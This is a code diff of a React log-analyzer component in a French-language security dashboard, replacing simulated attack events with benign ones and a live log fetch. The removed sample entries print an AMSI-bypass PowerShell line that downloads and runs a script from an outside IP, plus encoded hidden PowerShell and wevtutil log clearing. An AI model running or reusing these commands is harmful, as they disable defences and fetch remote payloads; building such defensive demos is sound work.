@@ -1,6 +1,7 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect, useCallback } from 'react';
 import { ShieldAlert, AlertTriangle, FileText, Filter, Terminal, Search, Upload, Download, Copy, Check, Info, Shield, Radio, RefreshCw } from 'lucide-react';
 import { WindowsEventLogEntry } from '../types/cyberdefense';
+import { apiFetch } from '../utils/api';
 
 interface LogAnalyzerProps {
   onRunInConsole: (command: string) => void;
@@ -9,107 +10,74 @@ interface LogAnalyzerProps {
 export const LogAnalyzer: React.FC<LogAnalyzerProps> = ({ onRunInConsole }) => {
   const initialEvents: WindowsEventLogEntry[] = [
     {
-      id: 'ev-1',
-      eventId: 4688,
+      id: 'ev-init-1',
+      eventId: 4624,
       channel: 'Security',
-      timeCreated: '2026-10-12 07:35:12',
-      level: 'CRITICAL',
-      source: 'Microsoft-Windows-Security-Auditing',
-      user: 'NT AUTHORITY\\SYSTEM',
-      computer: 'SEC-ENDPOINT-01',
-      description: 'Création d\'un nouveau processus suspect : powershell.exe avec arguments encodés en Base64 et contournement d\'exécution.',
-      rawPayload: '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><EventID>4688</EventID></System><EventData><Data Name="NewProcessName">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name="CommandLine">powershell.exe -NoP -NonI -W Hidden -enc SQBFAFgAIAAoAE4AZQB3...==</Data><Data Name="ParentProcessName">C:\\Users\\User\\AppData\\Local\\Temp\\svch0st_updater.exe</Data></EventData></Event>',
-      mitreTactic: 'T1059.001 - Execution: PowerShell',
-      isIsolatedThreat: true,
-    },
-    {
-      id: 'ev-2',
-      eventId: 4104,
-      channel: 'PowerShell',
-      timeCreated: '2026-10-12 07:35:14',
-      level: 'CRITICAL',
-      source: 'Microsoft-Windows-PowerShell',
-      user: 'SYSTEM',
-      computer: 'SEC-ENDPOINT-01',
-      description: 'Script Block Logging : Tentative de neutralisation d\'AMSI (AmsiScanBuffer memory patch) et appel Invoke-Expression.',
-      rawPayload: '[Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\').GetField(\'amsiInitFailed\',\'NonPublic,Static\').SetValue($null,$true); IEX (New-Object Net.WebClient).DownloadString("http://185.220.101.4/payload.ps1")',
-      mitreTactic: 'T1562.001 - Defense Evasion: Impair AMSI',
-      isIsolatedThreat: true,
-    },
-    {
-      id: 'ev-3',
-      eventId: 1116,
-      channel: 'Defender',
-      timeCreated: '2026-10-12 07:35:16',
-      level: 'ERROR',
-      source: 'Microsoft-Windows-Windows Defender',
-      user: 'SYSTEM',
-      computer: 'SEC-ENDPOINT-01',
-      description: 'Détection Trojan:Win32/Swisyn!rfn bloquée par verrouillage de fichier. Action de remédiation en attente de reboot.',
-      rawPayload: 'Threat Name: Trojan:Win32/Swisyn!rfn | Severity: Severe | Path: C:\\Windows\\System32\\drivers\\suspicious_kernel_hook.sys | Error Code: 0x80070020 (ERROR_SHARING_VIOLATION)',
-      mitreTactic: 'T1204.002 - Malicious File Execution',
-      isIsolatedThreat: true,
-    },
-    {
-      id: 'ev-4',
-      eventId: 7045,
-      channel: 'System',
-      timeCreated: '2026-10-12 07:34:40',
-      level: 'WARNING',
-      source: 'Service Control Manager',
-      user: 'SYSTEM',
-      computer: 'SEC-ENDPOINT-01',
-      description: 'Nouveau pilote/service kernel enregistré sous le nom "SysHookFlt" pointant vers un fichier .sys non-signé.',
-      rawPayload: 'ServiceName: SysHookFlt | ImagePath: \\??\\C:\\Windows\\System32\\drivers\\suspicious_kernel_hook.sys | ServiceType: Kernel Mode Driver | StartType: Auto start',
-      mitreTactic: 'T1543.003 - Persistence: Windows Service',
-      isIsolatedThreat: true,
-    },
-    {
-      id: 'ev-5',
-      eventId: 4625,
-      channel: 'Security',
-      timeCreated: '2026-10-12 07:33:02',
-      level: 'WARNING',
-      source: 'Microsoft-Windows-Security-Auditing',
-      user: 'Administrator',
-      computer: 'SEC-ENDPOINT-01',
-      description: 'Échec d\'ouverture de session (Code statut: 0xC000006D, Statut secondaire: 0xC000006A - Mot de passe incorrect). 14 tentatives rapprochées.',
-      rawPayload: 'LogonType: 3 (Network) | Workstation: REMOTE-CALI | Source IP: 185.220.101.4 | TargetUserName: Administrator',
-      mitreTactic: 'T1110.001 - Credential Access: Password Guessing',
-      isIsolatedThreat: true,
-    },
-    {
-      id: 'ev-6',
-      eventId: 1102,
-      channel: 'Security',
-      timeCreated: '2026-10-12 07:30:10',
-      level: 'CRITICAL',
-      source: 'Microsoft-Windows-Security-Auditing',
-      user: 'LocalAdmin',
-      computer: 'SEC-ENDPOINT-01',
-      description: 'Le journal d\'audit de sécurité a été effacé (Anti-forensics / Log Clearing via wevtutil cl Security).',
-      rawPayload: 'Audit Log Cleared. SubjectUserSid: S-1-5-21-...-500 | CallerProcessId: 4120 (cmd.exe)',
-      mitreTactic: 'T1070.001 - Defense Evasion: Clear Windows Event Logs',
-      isIsolatedThreat: true,
-    },
-    {
-      id: 'ev-7',
-      eventId: 4672,
-      channel: 'Security',
-      timeCreated: '2026-10-12 07:35:01',
+      timeCreated: new Date().toLocaleTimeString('fr-FR'),
       level: 'INFORMATION',
       source: 'Microsoft-Windows-Security-Auditing',
+      user: 'NT AUTHORITY\\SYSTEM',
+      computer: 'SEC-LOCAL-WORKSTATION',
+      description: 'Ouverture de session Windows réussie. Authentification Kerberos / NTLM vérifiée.',
+      rawPayload: 'LogonType: 2 (Interactive) | AuthenticationPackage: Kerberos | ElevationType: Full',
+      mitreTactic: 'Contrôle d\'Accès & Identité',
+      isIsolatedThreat: false,
+    },
+    {
+      id: 'ev-init-2',
+      eventId: 1000,
+      channel: 'System',
+      timeCreated: new Date().toLocaleTimeString('fr-FR'),
+      level: 'INFORMATION',
+      source: 'Microsoft-Windows-Kernel-General',
       user: 'SYSTEM',
-      computer: 'SEC-ENDPOINT-01',
-      description: 'Privilèges spéciaux attribués à une nouvelle ouverture de session (SeDebugPrivilege, SeSecurityPrivilege).',
-      rawPayload: 'SubjectUserSid: S-1-5-18 (NT AUTHORITY\\SYSTEM) | Privileges: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege',
-      mitreTactic: 'T1078 - Valid Accounts',
+      computer: 'SEC-LOCAL-WORKSTATION',
+      description: 'Démarrage du système d\'exploitation et chargement des sous-systèmes d\'intégrité.',
+      rawPayload: 'OSBoot: Clean | HypervisorEnforcedCodeIntegrity: Active',
+      mitreTactic: 'Intégrité du Système',
+      isIsolatedThreat: false,
+    },
+    {
+      id: 'ev-init-3',
+      eventId: 1116,
+      channel: 'Defender',
+      timeCreated: new Date().toLocaleTimeString('fr-FR'),
+      level: 'INFORMATION',
+      source: 'Microsoft-Windows-Windows Defender',
+      user: 'SYSTEM',
+      computer: 'SEC-LOCAL-WORKSTATION',
+      description: 'Protection en temps réel opérationnelle. Base virale à jour.',
+      rawPayload: 'EngineVersion: 1.1.24050.5 | SignaturesVersion: 1.411.120.0 | Status: Healthy',
+      mitreTactic: 'Protection Endpoint',
       isIsolatedThreat: false,
     },
   ];
 
   const [events, setEvents] = useState<WindowsEventLogEntry[]>(initialEvents);
+  const [isLoadingLogs, setIsLoadingLogs] = useState<boolean>(false);
   const [channelFilter, setChannelFilter] = useState<string>('ALL');
+
+  // Fetch real Windows Event Logs from host endpoint
+  const fetchRealLogs = useCallback(async (channel = 'System') => {
+    setIsLoadingLogs(true);
+    try {
+      const res = await apiFetch(`/api/system/eventlogs?channel=${encodeURIComponent(channel)}`);
+      if (res.ok) {
+        const data = await res.json();
+        if (data.success && Array.isArray(data.events) && data.events.length > 0) {
+          setEvents(data.events);
+        }
+      }
+    } catch (err) {
+      console.warn('[LogAnalyzer] Failed to fetch real logs:', err);
+    } finally {
+      setIsLoadingLogs(false);
+    }
+  }, []);
+
+  useEffect(() => {
+    fetchRealLogs(channelFilter === 'ALL' ? 'System' : channelFilter);
+  }, [fetchRealLogs, channelFilter]);
   const [levelFilter, setLevelFilter] = useState<string>('ALL');
   const [searchTerm, setSearchTerm] = useState<string>('');
   const [isolatedOnly, setIsolatedOnly] = useState<boolean>(false);
